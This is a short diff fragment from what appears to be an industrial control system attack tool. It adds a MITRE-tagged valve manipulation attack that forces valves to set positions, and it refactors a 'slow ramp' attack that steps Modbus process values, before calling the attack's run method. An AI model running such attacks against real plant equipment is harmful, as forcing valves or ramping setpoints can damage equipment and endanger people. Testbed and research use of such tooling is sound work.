+                'id': 16, 'name': 'Valve Manipulation Attack',
+                'mitre_id': 'T0836', 'duration': args.duration,
                 'parameters': {
                     'target_valves': args.target_valves,
                     'forced_position': args.valve_position
@@ -950,19 +1110,20 @@ Examples:
         elif args.attack == 'slow_ramp':
             config = build_attack_config('slow_ramp')
             config['duration'] = args.duration
-            config['parameters']['target'] = args.ramp_target
-            config['parameters']['start_value'] = args.start_value
-            config['parameters']['end_value'] = args.end_value
-            config['parameters']['step_size'] = args.step_size
-            config['parameters']['step_interval'] = args.step_interval
-            config['parameters']['use_physics'] = use_physics
+            config['parameters'].update({
+                'target':        args.ramp_target,
+                'start_value':   args.start_value,
+                'end_value':     args.end_value,
+                'step_size':     args.step_size,
+                'step_interval': args.step_interval,
+                'use_physics':   use_physics
+            })
             attack = SlowRampAttack(orchestrator.modbus, config)
 
         else:
             logger.error(f"Unknown attack type: {args.attack}")
             return 1
 
-        # ── Execute ────────────────────────────────────────────────────────
         attack.run()
 
     finally:
